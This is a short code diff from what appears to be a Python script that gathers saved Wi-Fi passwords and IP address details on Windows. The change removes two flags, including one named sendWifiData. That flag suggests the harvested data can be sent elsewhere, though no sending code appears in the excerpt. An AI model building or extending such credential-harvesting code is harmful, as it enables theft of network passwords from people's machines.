@@ -51,8 +51,7 @@ for segment in profiles:
 			print("No Password Found...")
 	except subprocess.CalledProcessError:
 		print("Error With Wifi Name Or Decode...")
-useSpoilers = "false"
-sendWifiData = "false"
+
 #get ip data
 ipv4 = subprocess.check_output("ipconfig | findstr /i ipv4", shell=True).decode('utf-8')
 ipv6 = subprocess.check_output("ipconfig | findstr /i ipv6", shell=True).decode('utf-8')
